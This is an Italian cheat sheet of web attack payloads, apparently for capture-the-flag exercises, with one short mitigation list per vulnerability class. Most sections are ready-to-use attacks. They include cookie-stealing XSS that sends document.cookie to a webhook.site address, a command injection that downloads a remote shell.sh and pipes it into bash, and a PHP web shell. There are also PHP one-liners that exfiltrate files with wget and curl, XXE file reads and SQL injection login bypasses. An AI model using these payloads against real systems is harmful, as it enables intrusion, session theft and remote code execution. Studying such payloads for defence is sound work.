# Guida agli Esercizi di Sicurezza


---

## **SSRF (Server-Side Request Forgery)**

### **Obiettivo**
Accedere a risorse interne del server o eseguire richieste verso destinazioni non consentite.

### **Payload di Base**

- **Accesso a risorse locali:**

    ```text
  http://localhost/admin
  http://127.0.0.1:80
  http://0.0.0.0:80
    ```

- **Accesso a file interni:**

    ```text
  http://localhost/etc/passwd
    ```

- **Bypass di Filtri (Encoding):**

    ```text
  http://127.0.0.1:80%2f..
  http://127.0.0.1%2500/etc/passwd
    ```

- **DNS Rebinding:**

    ```text
  http://webhook.site/42c40dc4-22d0-46a1-a364-2732cc60eb32
  http://malicious.domain/admin
    ```

### **Test con cURL**

```bash
curl "http://target-site.com/?url=http://localhost/admin"
```

### **Mitigazione**
- Valida rigorosamente l'input URL con una whitelist di domini consentiti.
- Usa richieste server-side sicure.

---

## **XSS (Cross-Site Scripting)**

### **Obiettivo**
Eseguire script dannosi nel browser della vittima per rubare dati sensibili o prendere il controllo della sessione.

### **Payload Riflessi**

- **Script semplice:**

    ```html
  <script>alert(1)</script>
    ```

- **Ruba i cookie:**

    ```html
  <img src="x" onerror="fetch('https://webhook.site/42c40dc4-22d0-46a1-a364-2732cc60eb32?cookie='+document.cookie)">
    ```

- **Bypass dei filtri con SVG:**

    ```html
  <svg onload="fetch('https://webhook.site/42c40dc4-22d0-46a1-a364-2732cc60eb32?cookie='+document.cookie)"></svg>
    ```

### **Payload Persistenti**

- **Aggiungere uno script:**

    ```html
  <script>document.body.innerHTML='<h1>Hacked</h1>'</script>
    ```

### **Mitigazione**
- Escapa l'input dell'utente prima di mostrarlo nel DOM.
- Usa Content Security Policy (CSP).

---

## **SQL Injection**

### **Obiettivo**
Manipolare query SQL per bypassare l'autenticazione o accedere a dati non autorizzati.

### **Payload di Base**

- **Bypass Login:**

    ```sql
  ' OR '1'='1 --
  " OR "1"="1 --
    ```

- **Ottenere dati:**

    ```sql
  ' UNION SELECT null, database(), user() --
  ' UNION SELECT 1,2,table_name FROM information_schema.tables --
    ```

- **Esfiltrare una colonna specifica:**

    ```sql
  ' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users' --
    ```

### **Blind SQL Injection**

- **Verifica di una condizione:**

    ```sql
  ' AND IF(1=1, SLEEP(5), 0) --
  ' AND (SELECT CASE WHEN (username='admin') THEN SLEEP(5) ELSE 0 END) --
    ```

### **Mitigazione**
- Usa query parametrizzate/preparate.
- Non concatenare mai input utente direttamente in query SQL.

---

## **LFI (Local File Inclusion)**

### **Obiettivo**
Leggere file interni del server.

### **Payload di Base**

- **Accesso a /etc/passwd:**

    ```bash
  ?page=../../../../etc/passwd
  ?page=../../../../etc/passwd%00
    ```

- **Accesso a file di log:**

    ```bash
  ?page=../../../../var/log/apache2/access.log
    ```

### **Mitigazione**
- Valida rigorosamente i percorsi forniti dall'utente.
- Usa funzioni come `realpath()` per verificare che il file sia in una directory consentita.

---

## **Command Injection**

### **Obiettivo**
Eseguire comandi arbitrari sul server.

### **Payload di Base**

- **Esegui un comando semplice:**

    ```bash
  ; ls -la
  && cat /etc/passwd
  || whoami
    ```

- **Crea un file:**

    ```bash
  `touch /tmp/hacked`
  ; touch /tmp/hacked
    ```

- **Comandi complessi:**

    ```bash
  ; curl https://webhook.site/42c40dc4-22d0-46a1-a364-2732cc60eb32/shell.sh | bash
    ```

### **Mitigazione**
- Usa funzioni sicure come `escapeshellarg()`.
- Non concatenare input utente in comandi di shell.

---

## **Insecure File Upload**

### **Obiettivo**
Caricare un file dannoso (es. script PHP) sul server.

### **Payload di Base**

- **File PHP malevolo:**

    ```php
  <?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>
    ```

- **Caricamento tramite POST (con curl):**

    ```bash
  curl -X POST -F "file=@shell.php" http://target-site.com/upload
    ```

### **Mitigazione**
- Valida estensioni e content-type, rinomina i file.
- Disabilita l'esecuzione di script nella directory di upload.

---

## **RCE (Remote Code Execution)**

### **Obiettivo**
Eseguire codice arbitrario sul server.

### **Payload PHP (Esfiltrazione con Webhook)**

- **Lettura file semplice:**

    ```php
  <?php system("cat ../../../../../../../flag.txt") ?>
    ```

- **Esfiltrazione file via POST:**

    ```php
  <?php system("wget --post-file ../../../../../../../flag.txt https://webhook.site/42c40dc4-22d0-46a1-a364-2732cc60eb32") ?>
    ```

- **Esfiltrazione file via GET (in Base64):**

    ```php
  <?php system("curl -s -G https://webhook.site/42c40dc4-22d0-46a1-a364-2732cc60eb32 --data-urlencode d@<(cat ../../../../../../../flag.txt | base64 -w 0)") ?>
    ```

### **Mitigazione**
- Disabilita funzioni pericolose nel `php.ini` (`system`, `exec`, `shell_exec`, ecc.).
- Non valutare codice dinamicamente con input utente (`eval()`).

---

## **XXE (XML External Entity)**

### **Obiettivo**
Sfruttare il parsing XML per leggere file locali o esfiltrare dati.

### **Payload di Base**

- **Lettura file locale:**

    ```xml
  <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
    ```

- **Esfiltrazione OOB (Out-of-Band) verso Webhook:**

    ```xml
  <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "https://webhook.site/42c40dc4-22d0-46a1-a364-2732cc60eb32/?data=test" >]>
  <foo>&xxe;</foo>
    ```

### **Mitigazione**
- Disabilita la risoluzione delle entità esterne (XXE) e delle DTD nel parser XML.

---

## **CSRF (Cross-Site Request Forgery)**

### **Obiettivo**
Forzare il browser della vittima a eseguire azioni non volute su un'applicazione web in cui è autenticata.

### **Payload di Base**

- **Form auto-inviante (Es. Cambio Password):**

    ```html
  <form action="http://target-site.com/change-password" method="POST">
      <input type="hidden" name="new_password" value="hacked123">
  </form>
  <script>document.forms[0].submit();</script>
    ```

### **Mitigazione**
- Usa token Anti-CSRF univoci per ogni sessione.
- Implementa l'attributo `SameSite` nei cookie.

---

## **IDOR (Insecure Direct Object Reference)**

### **Obiettivo**
Accedere a risorse di altri utenti manipolando gli identificatori nelle richieste (es. API REST).

### **Payload di Base**

- **Manipolazione parametri URL o API:**

    ```text
  Originale: http://target-site.com/api/receipts?id=1234
  Modificato: http://target-site.com/api/receipts?id=1235
    ```

### **Mitigazione**
- Implementa controlli di autorizzazione lato server per ogni singola risorsa.
- Usa ID non sequenziali o imprevedibili (es. UUID).

---

## **Business Logic Flaw / Parameter Tampering**

### **Obiettivo**
Modificare i parametri delle richieste (es. quantità negative) o sfruttare le asimmetrie di type casting (`float` vs `int`) per aggirare la logica di business di un'app.

### **Payload di Base**

- **Manipolazione di quantità decimali (Type Juggling):**
  Aggiungere un articolo inviando una quantità di `0.99` se il controllo prezzi usa `float` ma il carrello salva in `int` (diventando `0`).
- **Compensazione con quantità negative:**

    ```bash
  # Checkout inviando quantità negative per abbassare il totale
  curl -X POST http://target-site.com/cart.php \
       -d "items[flag]=1&items[italy]=-1"
    ```

### **Mitigazione**
- Valida sempre input critici, es. imponendo interi positivi per prezzi e quantità (es. `qnt > 0`).
- Fai affidamento solo sui dati in `$_SESSION` lato server durante i calcoli (es. checkout).
